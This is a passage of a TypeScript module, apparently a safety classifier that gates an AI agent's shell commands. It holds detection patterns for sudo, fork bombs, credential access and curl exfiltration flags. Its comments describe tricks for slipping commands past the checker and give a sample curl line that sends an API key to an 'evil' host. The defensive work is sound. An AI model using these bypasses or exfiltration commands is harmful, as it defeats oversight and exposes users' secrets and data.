 * 几乎每条带静音重定向的命令弹窗,严重违反"尽量不打扰"(实机语料探针发现:44 条良性命令误拦 9 条)。
 * 块设备/内存设备(`/dev/sda`、`/dev/mem` 等)**不在**此列,仍按系统红线拦。
 */
const SAFE_DEVICE_PATH = /^\/dev\/(?:null|zero|full|random|urandom|std(?:in|out|err)|tty|fd\/\d+)$/i;

/** 路径是否落在系统/受保护目录(写入需确定性用户同意)。入参应为已归一的目标路径。 */
export function isProtectedSystemPath(target: string): boolean {
  if (typeof target !== 'string' || target.length === 0) return false;
  if (SAFE_DEVICE_PATH.test(toForwardSlashes(target))) return false;
  // 先剥离 Windows extended-length / device namespace 前缀(`\\?\` `\\.\` `\\?\UNC\`):toForwardSlashes
  // 后它们变成 `//?/C:/…` / `//./C:/…`,会绕过盘符系统目录匹配落入灰区(copilot 报;与 desktop
  // filePathPolicy.stripWinNamespace 对齐)。UNC 前缀还原成 `//server/share`。
  // 前缀可能是 `//?/`(toForwardSlashes 直转)或 `/?/`(normalizeTarget 折叠了双斜杠,copilot 报)→ 用
  // `\/+` 兼容 1 个或多个前导斜杠。仅当其后是盘符或 UNC 才剥,避免误伤 POSIX `/./foo` 这类合法路径。
  const fwd = toForwardSlashes(target)
    .replace(/^\/+[?.]\/UNC\//i, '//')
    .replace(/^\/+[?.]\/(?=[A-Za-z]:)/, '');
  return SYSTEM_WRITE_PATH_PATTERNS.some((re) => re.test(fwd));
}

/**
 * 无法由主 Agent 换安全做法绕开的高影响同意边界。命中才 `prompt-each-time`：
 * 提权 / 系统与磁盘控制 / 凭证访问 / fork bomb / 全局权限放宽。
 */
const ALWAYS_ASK_PATTERNS: readonly RegExp[] = [
  /\b(?:sudo|doas|runuser)\b/,                           // 提权(runuser 名字独特,直接词界)
  // 裸 `su`(切换到其它用户/root)同属提权,但 "su" 常出现在无关文本里 → 只在命令位(段首/分隔符后,或
  // 已知启动器后)匹配,避免 `git commit -m "su"` 之类误升(自审补:sudo/doas 已红线,漏了同级的 su)。
  /(?:^|[\n|&;(]\s*|\b(?:sudo|doas|xargs|nohup|setsid|env|command|exec|time|timeout|nice|ionice|stdbuf|chrt|builtin|watch|flock)\s+(?:-\S+\s+)*)su\b(?![\w.-])/,
  // chroot 与 sudo/su 同族:需要 CAP_SYS_CHROOT(实践中即 root),且换根后**绝对路径也重新指向新根下**
  // (`chroot / rm -rf /outside` 会真删,`chroot /mnt rm -rf /repo` 删的是 /mnt/repo)→ 目标作用域静态
  // 不可证,只能确定性同意(codex 报:chroot 既不在包装器集合也不在红线,内层命令完全没被看见)。
  // 与 `su` 同样只在命令位匹配,避免 `git commit -m "fix chroot"` 之类文本误升。
  /(?:^|[\n|&;(]\s*|\b(?:sudo|doas|xargs|nohup|setsid|env|command|exec|time|timeout|nice|ionice|stdbuf|chrt|builtin|watch|flock|unshare|nsenter|setpriv)\s+(?:-\S+\s+)*)chroot\b(?![\w.-])/,
  /\b(?:mkfs|fdisk|dd)\b/,                               // 磁盘/文件系统操作
  /(?:^|\s)>\s*\/dev\/[sh]d/,                            // 写块设备
  /\b(?:shutdown|reboot|halt|poweroff)\b/,               // 系统电源
  /:\s*\(\s*\)\s*\{.*\|.*&.*\}/,                          // fork bomb :(){ :|:& };:
  /\bchmod\b[^|;&]*\s(?:-R\s+)?[0-7]*7{2,3}\b/,           // chmod 777 之类数字放宽权限
  /\bchmod\b[^|;&]*\s[ugoa]*[oa][ugoa]*[-+=][^\s]*w/,     // chmod 符号型对 other/all 开放写(a+w / o+w / a+rwx)
  ...SENSITIVE_CREDENTIAL_PATH_PATTERNS,                  // 凭证/密钥路径(见上)
  /\bsecurity\s+(?:find|dump|export|add)-/,               // macOS keychain
  /\$\{?[A-Za-z0-9_]*(?:KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|APIKEY|_PAT)[A-Za-z0-9_]*\}?/i, // 敏感环境变量展开(echo "$API_KEY" 等)
];

/**
 * 高风险但通常可由主 Agent 换一条安全做法的动作。它们进入当前模型 reviewer，而不是
 * 直接打断用户：reviewer 可 allow（明确、范围受控）、block（让 Agent 重试）或只在确实
 * 跨越高影响边界时 ask。
 */
const REVIEW_REQUIRED_PATTERNS: readonly RegExp[] = [
  /\brm\b[^|;&]*(?:\s-\w*[rRfF]|\s--(?:recursive|force|dir))/, // rm 递归/强制删除
  /\bfind\b[^|;&]*\s-delete\b/,                          // find -delete 批量删除

  // 执行影响型环境变量赋值：让“看似只读”的命令运行其它程序，应由 reviewer 静默拦截或判定。
  /(?:^|\s)(?:LD_PRELOAD|LD_LIBRARY_PATH|LD_AUDIT|DYLD_[A-Z_]+|GIT_PAGER|PAGER|GIT_SSH(?:_COMMAND)?|GIT_PROXY_COMMAND|GIT_ALLOW_PROTOCOL|GIT_PROTOCOL_FROM_USER|GIT_EXTERNAL_DIFF|GIT_CONFIG_(?:GLOBAL|SYSTEM)|BASH_ENV|PROMPT_COMMAND|PS4|PERL5LIB|PYTHONPATH|PYTHONSTARTUP|PYTHONINSPECT|NODE_OPTIONS|RUBYOPT|PATH)=/,
  /\bgit\b[^|;&]*\bpush\b[^|;&]*(?:--force\b|--force-with-lease\b|\s-f\b|\+)/, // 强推
  /\bgit\b[^|;&]*\breset\b[^|;&]*--hard/,                 // git reset --hard
  /\bgit\b[^|;&]*\bclean\b[^|;&]*\s-\w*f/,                // git clean -f
];

/** 命令替换 / 进程替换:参数里塞 `$(...)` / 反引号 / `<(...)`,可绕过静态判定 → 一律升级。 */
const COMMAND_SUBSTITUTION = /\$\(|`|<\(/;

/**
 * 去掉能**嵌进词中间**的 shell 参数展开:花括号形 `${...}` 与位置参数 `$1`(**不含**命令替换 `$(...)`,
 * 那个另有 COMMAND_SUBSTITUTION 拦)。攻击者把未设变量嵌进关键词/flag 中间(`find … -ex${UNSET}ec …`、
 * `rg --pr${UNSET}e=…`、`s${X}udo`),审查时字面不含 `-exec`/`sudo`,bash 展开成空后才成形(codex 报)。
 * 把这类展开抹成空得到的变体一并参与匹配,即可在展开前现形。
 *
 * **只剥 `${...}`/`$N`,不剥裸 `$VAR`**:中间嵌入必须靠花括号或单字符位置参数定界(裸 `$UNSETec` 会被
 * bash 当成变量名 `UNSETec`、无法拼出 `-exec`),故裸 `$VAR` 不构成此绕过;且裸形是 jq 的 `$ENV` 等语义
 * token,抹掉会破坏既有检测。作为**额外变体**叠加(不替换原串),`$API_KEY` 等敏感变量检测仍走原串。
 * `$VAR` 展开成非空值(如指向凭证路径)属静态不可闭合残口(同 DNS 重绑定)。
 */
function stripExpansions(s: string): string {
  return s
    .replace(/\$\{[^}]*\}/g, '') // ${VAR} / ${UNSET}
    .replace(/\$\d+/g, '');      // $1 位置参数(单字符,可无花括号嵌入词中)
}

/**
 * 带**运算符/替换文本**的花括号展开:`${X:-ec}`(默认值)、`${X:+y}`(替代值)、`${X/a/b}`(替换)、
 * `${X#p}`/`${X%s}`(裁剪)等。stripExpansions 把整段抹成空,会漏掉替换文本 —— `-ex${UNSET:-ec}` 抹空后
 * 是 `-ex`,但 bash 代入默认值 `ec` 拼成 `-exec`(codex 报)。这类展开静态不可求值,出现在"本要放行"的段里
 * 一律升级。纯变量名 `${VAR}`(无运算符)不匹配 —— 那个由 stripExpansions 的空值变体处理,值注入属残口。
 */
const SUBSTITUTION_EXPANSION = /\$\{[^}]*[-+=:?/#%^,!*@][^}]*\}/;

/**
 * bash 花括号展开:列表 `{a,b}` 或序列 `{x..y}`。**在分词前**展开,故能把关键词/flag 拆开
 * (`-ex{e..e}c`→`-exec`、`s{u..u}do`→`sudo`,codex 报),静态不可预测其展开结果。需含逗号或 `..`
 * 才是展开(find 占位符 `{}`、`{foo}` 不是)。仅当它出现在**命令名或 flag**里才升级(位置参数里的
 * `ls a/{b,c}` 只影响文件名,不升级;curl URL glob 另由 isSafeFetch 处理)。
 */
const BRACE_EXPANSION = /\{[^}]*(?:,|\.\.)[^}]*\}/;

/**
 * 把带默认/替代值的展开代入其文本,得到"展开后可能的形态":`${UNSET:-ec}`→`ec`、`${X:=sudo}`→`sudo`。
 * 供危险模式扫描,让藏在默认值里的危险关键词(sudo/rm 等)也现形。只抽 `:-`/`:=`/`:+`/`-`/`+`/`=` 后的文本。
 */
function substituteDefaults(s: string): string {
  return s.replace(/\$\{[A-Za-z0-9_]*:?[-+=]([^}]*)\}/g, '$1');
}

/**
 * 文件输出重定向 `>` / `>>`。凡 `>`/`>>` 且其后不是 `&` → 写文件(命中);`>` 后是 `&`(`2>&1`/`>&2` fd
 * 复制)→ 不命中。唯一前置排除是 `-`(避免 `a->b` 箭头误判)—— 数字/字母/`&` 在前都算写:`1>file`、
 * `payload2>~/.bashrc`(codex 报的数字结尾词)、`&>out`(stdout+stderr 合并写)全命中。
 * 调用方在**去掉引号内容**的串上匹配(引号内的 `>` 是数据不是重定向,见 classifyShellSegment)。
 */
const OUTPUT_REDIRECTION = /(?<!-)>>?(?!&)/;

/**
 * curl/wget 视为"只读取回"(命令行浏览器)的排除项。命中任一就不是安全 GET,交通用判定升级:
 *   - **上传数据 / 非 GET 方法**:外发内容(exfil 面)。
 *   - **落盘到文件**(`-o`/`-O`/`--output`):把远端内容写进任意路径(可覆盖 `~/.ssh/authorized_keys`
 *     等敏感文件)—— 与 shell 重定向同样是"写任意路径",必须升级。`curl URL`(默认 stdout)才放行。
 */
// curl 上传 / 非 GET 方法。含贴合式短选项(`-dDATA` / `-Ffield` / `-Tfile`)——`-[dFT]` 不带 \b,
// 贴合的 value 照样命中。大小写敏感(不加 /i):`-d/-F/-T` 是上传,`-D`(dump-header,只读)不能误伤。
// `-[a-zA-Z]*[dFT]`:短选项簇里含值取向的 -d/-F/-T(curl 无布尔短选项用 d/F/T),捕获贴合 `-dDATA`、
// 捆绑 `-sdsecret`、独立 `-d`;curl 大小写敏感,不误伤只读的 -D。
const CURL_UPLOAD_FLAGS = /(?:^|\s)-[a-zA-Z]*[dFT]|(?:^|\s)--(?:data|form|upload-file|json|url-query)[\w-]*/;
// 非 GET 方法(-X/--request POST 等)单列且**大小写不敏感**:curl 接受小写 `-X post` / `--request post`。
// 不能给上面的短选项簇整体加 /i —— 那会让 `[dFT]` 匹配到只读的 -f/-D,把 `curl -f` 误判成上传。
const CURL_NONGET_METHOD = /(?:^|\s)(?:-X|--request)[=\s]*(?:POST|PUT|DELETE|PATCH)\b/i;
// 落盘到文件/目录(curl -o/-O/-D/--output;wget -o 日志 /-O 文档 /-P 目录前缀)。写任意路径。
// 短选项用簇匹配 `-[a-zA-Z]*[oODP]`:除贴合 `-ofile`,还捕获与只读短选项捆绑的形态
// (`-sD/tmp/headers`、`-so/tmp/out` = -s 静默 + -D/-o 落盘),否则簇里的落盘 flag 会被漏放行。
// (wget 现整体升级、不再走安全 fetch,见 isSafeFetch;此常量仍供 curl 的 -o/-O 判定。)
// `dump-h[\w-]*`:curl 接受唯一前缀缩写,`--dump-h` 等同 `--dump-header`(copilot P1:缩写形绕过精确匹配)。
const FETCH_OUTPUT_FLAGS = /(?:^|\s)-[a-zA-Z]*[oODP]|(?:^|\s)--(?:output(?:-dir|-document)?|remote-name|directory-prefix|dump-h[\w-]*)\b/;
// curl 跟随重定向(-L/--location*):最终 host 静态不可判(可 302 跳到云 metadata/内网)→ 升级。
// 短选项同样用簇匹配 `-[a-zA-Z]*L`,捕获 `-sL`(-s 静默 + -L 跟随)这类捆绑形态。
const CURL_REDIRECT_FLAGS = /(?:^|\s)(?:-[a-zA-Z]*L|--location(?:-trusted)?)\b/;
// curl 带凭证 / 隐藏参数 / SSRF 改路由 / 环境变量导入的 flag → 升级。短选项大小写敏感。
//  - 凭证:-u/--user(basic auth)、--netrc*、-b/--cookie*(会话 cookie)、-H/--header 里的鉴权头。
//  - 隐藏参数:-K/--config(配置文件可藏 -d 上传)。
//  - SSRF 改路由:--resolve/--connect-to/--unix-socket(把看似公网的 URL 定向到内网/metadata)、-x/--proxy*、--interface。
//  - 环境变量外泄:--variable(`%NAME` 语法把环境变量导入)、--expand-*(把变量展开进 URL/参数)——
//    `curl --variable %ANTHROPIC_API_KEY --expand-url 'https://evil/{{ANTHROPIC_API_KEY}}'` 无 `$` 展开
//    也能把 provider 凭证塞进 URL 外发,故 --variable/--expand* 一律敏感。
// 短选项 -u/-b/-x/-K 同样用簇匹配(`-[a-zA-Z]*[ubxK]`)捕获贴合 `-uuser:pass` / 捆绑 `-su user`;
// curl 无布尔短选项用 u/b/x/K,不误伤(-k insecure 是小写 k,不在内)。长选项与鉴权头单列。
const CURL_SENSITIVE_FLAGS = /(?:^|\s)-[a-zA-Z]*[ubxK]|(?:^|\s)--(?:user|netrc\S*|config|cookie\S*|resolve|connect-to|unix-socket|proxy\S*|interface|variable|expand[\w-]*|oauth2-bearer)\b|(?:-H|--header)[=\s]*['"]?\s*(?:[Aa]uthorization|[Cc]ookie|[Xx]-[Aa]pi-[Kk]ey|[Xx]-[Aa]uth|[Pp]roxy-[Aa]uthorization)/;

/**
 * git 只读子命令 → 放行。
 * `ls-remote` **不在此列**:它是网络操作(联系远端),且 `remote.<name>.url=ext::…` / `url.<x>.insteadOf`
 * 这类 `.git/config` 可把看似无害的 `git ls-remote origin`(甚至显式 URL)重定向到执行型传输 → argv 无痕迹
 * 却跑 payload(codex 报)。无法只凭 argv 判定安全,一律升级(与 fetch/clone 等网络子命令同档)。
 */
const SAFE_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'status', 'log', 'diff', 'show', 'branch', 'remote', 'rev-parse', 'describe',
  'blame', 'shortlog', 'tag', 'ls-files', 'cat-file', 'reflog',
  'whatchanged', 'grep',
]);

/** 顶层 shell 分隔符:`&&` `||` `;` `|` 换行,以及作为后台操作符的独立 `&`。 */
function splitTopLevelSegments(command: string): string[] {
  // 保守拆分:引号内的分隔符会被误切,但只导致"多切几段、每段各自判定"——对不确定 fail-closed,
  // 过度拆分不放宽任何东西。独立 `&`(后台)才拆;`2>&1`/`>&`/`&>` 里的 `&` 是 fd 复制、不是
  // 分隔符,用前后不邻接 `>`/`&` 的条件把它们排除,避免把 `ls 2>&1` 这类常见命令误切成碎段。
  return command
    .split(/&&|\|\||[;\n|]|(?<![>&])&(?![>&])/g)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/** 轻量 shell tokenizer：引号外按空白切，拼接相邻的 quoted/unquoted 片段并保留反斜杠。 */
function tokenize(segment: string): string[] {
  const tokens: string[] = [];
  let token = '';
  let tokenStarted = false;
  let quote: "'" | '"' | null = null;
  let substitutionDepth = 0;
  const flush = (): void => {
    if (!tokenStarted) return;
    tokens.push(token);
    token = '';
    tokenStarted = false;
  };
  for (let i = 0; i < segment.length; i++) {
    const char = segment[i];
    if (char === '\\' && quote !== "'" && i + 1 < segment.length) {
      tokenStarted = true;
      token += char + segment[i + 1];
      i++;
      continue;
    }
    if (quote) {
      if (char === quote) quote = null;
      else token += char;
      tokenStarted = true;
      continue;
    }
    if ((char === '$' || char === '<') && segment[i + 1] === '(') {
      token += `${char}(`;
      tokenStarted = true;
      substitutionDepth += 1;
      i++;
      continue;
    }
    if (substitutionDepth > 0) {
      token += char;
      tokenStarted = true;
      if (char === '(') substitutionDepth += 1;
      else if (char === ')') substitutionDepth -= 1;
      continue;
    }
    if (char === "'" || char === '"') {
      // Preserve the ANSI-C quote marker so callers can distinguish $'…'
      // (runtime escape decoding) from an ordinary single-quoted fragment.
      if (char === "'" && token.endsWith('$')) token += char;
      quote = char;
      tokenStarted = true;
    } else if (/\s/.test(char)) {
      flush();
    } else {
      token += char;
      tokenStarted = true;
    }
  }
  flush();
  return tokens;
}

/**
 * 去掉分段后残留的 shell 分组/控制关键字，让组内真实命令继续参与安全判定。
 * 含 `!`(否定退出码,但**命令照常执行** —— `! rm -rf /outside` 仍会删,codex 报)与 `elif`/`until`/
 * `while`/`if` 等把真实命令挡在后面的关键字。
 */
function stripShellControlTokens(tokens: string[]): string[] {
  const out = [...tokens];
  while (out.length > 0 && /^(?:\{|\(|!|then|do|else|elif|if|while|until)$/.test(out[0])) out.shift();
  if (out[0]) out[0] = out[0].replace(/^[({]+/, '');
  while (out[0] === '') out.shift();
  const last = out.length - 1;
  if (last >= 0 && !/[$<]\(/.test(out[last])) {
    out[last] = out[last].replace(/[)}]+$/, '');
    if (out[last] === '') out.pop();
  }
  return out;
}

type UnwrappedCommand = {
  tokens: string[];
  cwd?: string;
  cwdUnknown: boolean;
  inspectionOnly: boolean;
  /** 达到剥壳上限时首 token 仍是包装器 = 未能看到真实命令(超深嵌套 `env env … rm`)→ 消费方 fail-closed。 */
  wrapperUnresolved: boolean;
};

// 透明包装器剥壳的递归上限。取 16:现实里嵌 1-2 层(`env timeout … cmd`),16 足够;更深属对抗构造,
// 到上限仍是包装器则 fail-closed 必问(codex 报 `env env env env env env rm -rf /outside`)。
const MAX_WRAPPER_UNWRAP_DEPTH = 16;

function resolveCwdTarget(
  target: string | undefined,
  currentCwd: string | undefined,
  currentCwdUnknown = false,
): { cwd?: string; cwdUnknown: boolean } {
  if (!target || target === '-' || /[$`~{}*?[\]]/.test(target)) {
    return { cwdUnknown: true };
  }
  if (!isAbsolutePath(toForwardSlashes(target)) && (!currentCwd || currentCwdUnknown)) {
    return { cwdUnknown: true };
  }
  return {
    cwd: normalizeTarget(target, currentCwd ? [currentCwd] : []),
    cwdUnknown: false,
  };
}

/** 剥掉包裹器及其参数；同时保留 env -C/--chdir 对内层命令 cwd 的影响。 */
function unwrapCommand(
  tokens: string[],
  initialCwd?: string,
  initialCwdUnknown = false,
): UnwrappedCommand {
  let toks = stripShellControlTokens(tokens);
  let cwd = initialCwd;
  let cwdUnknown = initialCwdUnknown;
  let inspectionOnly = false;
  const applyCwd = (target: string | undefined): void => {
    const next = resolveCwdTarget(target, cwd, cwdUnknown);
    cwd = next.cwd;
    cwdUnknown = next.cwdUnknown;
  };
  let depth = 0;
  for (; depth < MAX_WRAPPER_UNWRAP_DEPTH && toks.length > 0; depth++) {
    // 前置环境赋值:bash simple-command 展开把 `NAME=val` 应用到命令环境后照常执行后面的命令
    // (`FOO=1 rm -rf /outside`)。不消费它们会把 `FOO=1` 当可执行名而看不到真正的 rm(codex 报)→
    // 先剥掉所有前导 assignment word,再识别真实执行器/包裹器。
    let assignEnd = 0;
    while (assignEnd < toks.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(toks[assignEnd])) assignEnd++;
    if (assignEnd > 0) toks = toks.slice(assignEnd);
    if (toks.length === 0) break;
    // executableName 归一 `.exe`/大小写:`env.exe`/`timeout.exe` 等包裹器也要剥壳,否则 `env.exe`(dump 环境)
    // 或 `timeout.exe 5 rm -rf /outside`(内层破坏)会因包裹器没被识别而漏判。
    const head = executableName(toks[0]);
    if (!COMMAND_WRAPPERS.has(head)) break;
    if (head === 'env') {
      // env [-i] [-u NAME]... [-C DIR] [NAME=val...] cmd args。**必须精确消费带独立参数的选项** ——
      // `-u`/`--unset` 后跟的 NAME 若被当成内层命令(如 `env -u ls ./payload`:-u 消费 ls、真正执行的是
      // ./payload)会漏放行(codex 报)。未建模的选项(尤其 `-S`/`--split-string` 会把参数重解析成整条
      // 命令串)不猜测、保留原 token → 后续分类必 fail-closed 升级。
      let i = 1;
      let bail = false;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '-' || t === '-i' || t === '--ignore-environment' || t === '-0' || t === '--null' || t === '-v' || t === '--debug') { i++; continue; }
        if (t === '-u' || t === '--unset') { i += 2; continue; }
        if (t === '-C' || t === '--chdir') {
          applyCwd(toks[i + 1]);
          i += 2;
          continue;
        }
        const longChdir = /^--chdir=(.*)$/.exec(t);
        if (longChdir) { applyCwd(longChdir[1]); i++; continue; }
        const shortChdir = /^-C=?(.+)$/.exec(t);
        if (shortChdir) { applyCwd(shortChdir[1]); i++; continue; }
        if (/^--unset=/.test(t) || /^-u./.test(t)) { i++; continue; } // --unset=NAME / -uNAME
        if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) { i++; continue; }                                 // NAME=VALUE
        if (t.startsWith('-')) { bail = true; break; }  // -S/--split-string 及一切未建模选项 → 不剥,fail-closed
        break;                                          // 内层命令
      }
      // bail 时 toks[i] 是可疑选项(如 -S),保留它作首 token → classifyShellSegment 认不出安全命令 → 升级。
      toks = toks.slice(i);
      if (bail) break;
    } else if (head === 'command') {
      // Bash builtin: command [-pVv] command [arg ...]. `-p` still executes the
      // inner command, while -v/-V only inspect it. Consume supported options
      // and `--` so a real executor cannot hide behind `command -p`.
      let i = 1;
      let bail = false;
      let inspectsCommand = false;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        if (/^-[pVv]+$/.test(t)) {
          if (/[Vv]/.test(t)) inspectsCommand = true;
          i++;
          continue;
        }
        if (t.startsWith('-')) { bail = true; break; }
        break;
      }
      toks = toks.slice(i);
      if (bail) break;
      if (inspectsCommand) {
        toks = [];
        inspectionOnly = true;
        break;
      }
    } else if (head === 'exec') {
      // POSIX shell builtin: exec [-cl] [-a name] [command [args…]]. 未建模选项不剥壳，
      // 保持 fail-closed；已知选项后继续递归识别真实执行器。
      let i = 1;
      let bail = false;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        if (t === '-a') { i += 2; continue; }
        if (/^-a.+/.test(t) || /^-[cl]+$/.test(t)) { i++; continue; }
        if (t.startsWith('-')) { bail = true; break; }
        break;
      }
      toks = toks.slice(i);
      if (bail) break;
    } else if (head === 'timeout' || head === 'time' || head === 'nice' || head === 'ionice' || head === 'chrt' || head === 'stdbuf') {
      // 带自身参数(timeout 5 / nice -n 10 / stdbuf -oL):跳过前导 `-*` 与紧随的数值/时长参数。
      let i = 1;
      while (i < toks.length) {
        const t = toks[i];
        // timeout -s/--signal SIG、-k/--kill-after DUR:带独立值选项,须连值一起消费 —— 否则停在 SIG(如 KILL)
        // 把真正的内层命令(rm 等)当参数漏掉(codex 报 `timeout -s KILL 5 rm -rf /outside`)。
        if (head === 'timeout' && /^(?:-s|--signal|-k|--kill-after)$/.test(t)) { i += 2; continue; }
        // stdbuf -i/-o/-e MODE(分离形态):MODE(如 `L`/`0`/`4K`)是独立 token,不连值消费会停在 MODE
        // 漏掉内层命令(codex 报 `stdbuf -o L rm -rf /outside`)。附加形态 `-oL`/`--output=L` 作单 token。
        if (head === 'stdbuf' && /^(?:-[ioe]|--input|--output|--error)$/.test(t)) { i += 2; continue; }
        // GNU time -f/--format FORMAT、-o/--output FILE 带值:分离形态不连值消费会停在 FORMAT(如 `%e`)漏掉
        // 内层命令(codex 报 `/usr/bin/time -f '%e' rm -rf /outside`)。bash 内建 time 无此选项、不受影响。
        if (head === 'time' && /^(?:-f|--format|-o|--output)$/.test(t)) { i += 2; continue; }
        // ionice -c/--class <class>:class 可为名字(idle/best-effort/realtime/none)或数字;命名值非数字,
        // 不连值消费会停在 `idle` 漏掉内层命令(codex 报 `ionice -c idle rm -rf /outside`)。
        if (head === 'ionice' && /^(?:-c|--class)$/.test(t)) { i += 2; continue; }
        // 时长可为浮点(timeout 文档:DURATION 是浮点数,`timeout 0.5 rm …`),整数正则会停在 0.5 漏掉内层
        // 命令(codex 报)→ 接受 `0.5` / `1.5s` / `.5` 等小数时长。
        if (t.startsWith('-') || /^\d*\.?\d+[smhd]?$/.test(t)) { i++; continue; }
        break;
      }
      toks = toks.slice(i);
    } else if (head === 'watch') {
      // watch [options] COMMAND:周期执行 COMMAND。`-n`/`--interval` 带值,其余 `-flag` 单 token,`--` 终结
      // 选项(codex 报 `watch -- rm -rf /outside`)。COMMAND 若是带空格的单 token(`watch 'rm -rf x'`)则再拆。
      let i = 1;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        // 带独立值选项:-n/--interval <secs>、-q/--equexit <cycles>(codex 报:漏了 equexit 会停在其值漏掉命令)。
        if (t === '-n' || t === '--interval' || t === '-q' || t === '--equexit') { i += 2; continue; }
        if (t.startsWith('-')) { i++; continue; }
        break;
      }
      toks = toks.slice(i);
      if (toks.length === 1 && /\s/.test(toks[0])) toks = tokenize(toks[0]);
    } else if (head === 'flock') {
      // flock [options] <file> COMMAND [args] 或 flock [options] <file> -c '<shell 命令串>'。
      // 消费带值选项(-w/--timeout、-E/--conflict-exit-code),跳过一个 lockfile 操作数,其余为真实命令
      // (codex 报 `flock /tmp/lock rm -rf /outside`)。-c 形态其后是 shell 命令串,再拆成 argv。
      let i = 1;
      let shellForm = false;
      let consumedLockfile = false;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        if (t === '-w' || t === '--timeout' || t === '-E' || t === '--conflict-exit-code') { i += 2; continue; }
        if (t === '-c' || t === '--command') { shellForm = true; i++; break; }
        if (t.startsWith('-')) { i++; continue; }
        if (!consumedLockfile) { consumedLockfile = true; i++; continue; }
        break;
      }
      toks = toks.slice(i);
      if ((shellForm || toks.length === 1) && toks.length >= 1 && /\s/.test(toks[0])) toks = tokenize(toks[0]);
    } else if (head === 'taskset') {
      // taskset [options] <mask> COMMAND 或 taskset -c/--cpu-list <list> COMMAND(codex 报 `taskset -c 0 rm …`)。
      // -p/--pid 是改已有进程的亲和性、不跑新命令 → 不解包(fail-closed 留原样)。
      if (toks.slice(1).some((t) => /^--pid$/.test(t) || /^-[a-z]*p[a-z]*$/i.test(t))) break;
      let i = 1;
      let cpuListGiven = false;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        if (t === '-c' || t === '--cpu-list') { cpuListGiven = true; i += 2; continue; }
        if (/^--cpu-list=/.test(t) || /^-c.+/.test(t)) { cpuListGiven = true; i++; continue; }
        if (t.startsWith('-')) { i++; continue; }
        break;
      }
      if (!cpuListGiven && i < toks.length) i++; // 无 -c 时首个非选项是 mask 操作数,跳过
      toks = toks.slice(i);
    } else if (head === 'prlimit') {
      // prlimit [options] [--<resource>=<limit>] COMMAND(codex 报 `prlimit --nofile=1024 rm -rf /outside`)。
      // 资源限额多为 `--nofile=1024` 附加形态;-p/--pid 是改已有进程、不跑命令 → 不解包(fail-closed 留壳)。
      if (toks.slice(1).some((t) => /^(?:-p|--pid)$/.test(t) || /^--pid=/.test(t))) break;
      let i = 1;
      while (i < toks.length && toks[i].startsWith('-')) {
        // -o/--output <list> 是带独立值选项:不连值消费会停在 RESOURCE 而看不到内层命令(codex 报)。
        if (/^(?:-o|--output)$/.test(toks[i])) { i += 2; continue; }
        i++;
      }
      toks = toks.slice(i);
    } else if (head === 'setarch') {
      // setarch [arch] [options] PROGRAM(codex 报 `setarch x86_64 rm -rf /outside`)。首个非选项若形似已知
      // 架构名则作 arch 跳过(否则它就是 PROGRAM,不误跳);其余选项跳过后即真实命令。--list 无 PROGRAM。
      let i = 1;
      let archConsumed = false;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        if (t.startsWith('-')) { i++; continue; }
        if (!archConsumed
          && /^(?:x86_64|i[3456]86|ia64|s390x?|ppc(?:64(?:le)?)?|arm(?:v[0-9]+l?)?|aarch64|mips\w*|sparc\w*|riscv\w*|uname26|linux(?:32|64))$/i.test(t)) {
          archConsumed = true; i++; continue;
        }
        break; // PROGRAM
      }
      toks = toks.slice(i);
    } else if (head === 'unshare' || head === 'nsenter' || head === 'setpriv') {
      // 只消费 `-…` 选项;**仅对确知带独立值的选项**多吃一个 token —— 宁可少吃(留下的值当命令名 →
      // 未知 bin → 灰区,fail-closed)也不能多吃(会把真正的 rm 吞掉 → 漏红线)。
      // `--wd/-w DIR` 改工作目录(同 env -C);`--root/-R/-r` 换根 → 路径语义不可静态求证 → cwdUnknown。
      const valued = head === 'unshare'
        ? /^(?:--setuid|--setgid|--propagation|--map-user|--map-group|--wd|--root|-S|-G|-w|-R)$/
        : head === 'nsenter'
          ? /^(?:--target|--wd|--root|--setuid|--setgid|-t|-w|-r|-S|-G)$/
          // setpriv 的带值选项:除 --reuid/--regid,还有 --euid/--ruid/--egid/--rgid(codex 报:遗漏它们
          // 会让解析停在 uid 值 `0` 而看不到内层 rm)。
          : /^(?:--reuid|--regid|--euid|--ruid|--egid|--rgid|--groups|--securebits|--pdeathsig|--selinux-label|--apparmor-profile|--ambient-caps|--inh-caps|--bounding-set|--rlimit)$/;
      let i = 1;
      let rootChanged = false;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        if (!t.startsWith('-')) break;
        if (/^(?:--root|-R|-r)(?:=|$)/.test(t)) rootChanged = true;
        const wd = /^(?:--wd|-w)=(.+)$/.exec(t);
        if (wd) { applyCwd(wd[1]); i++; continue; }
        const rootAttached = /^(?:--root|-R|-r)=(.+)$/.exec(t);
        if (rootAttached) { i++; continue; }
        if (valued.test(t)) {
          if (/^(?:--wd|-w)$/.test(t)) applyCwd(toks[i + 1]);
          i += 2;
          continue;
        }
        i++;
      }
      toks = toks.slice(i);
      // 换根后 `/outside` 之类绝对路径指向新根下的位置,静态不可证 → 相对与绝对目标都按未知处理。
      if (rootChanged) { cwd = undefined; cwdUnknown = true; }
    } else if (head === 'script') {
      // 两种形态都会跑命令:util-linux `script [opts] -c '<命令串>' [file]`(值经 shell 执行)与
      // BSD/macOS `script [opts] [file [command ...]]`(尾随 argv)。带独立值的日志/管道选项要消费其值,
      // 否则解析会停在文件名;`-t`(util-linux 的 --timing 可无值)刻意不消费 —— 少吃只会让它当成
      // file 操作数被跳过,多吃则可能把真正的命令吞掉。
      let i = 1;
      let commandString: string | undefined;
      let fileConsumed = false;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        if (t.startsWith('-')) {
          const attachedCmd = /^(?:--command=|-c)(.+)$/.exec(t);
          if (attachedCmd) { commandString = attachedCmd[1]; i++; continue; }
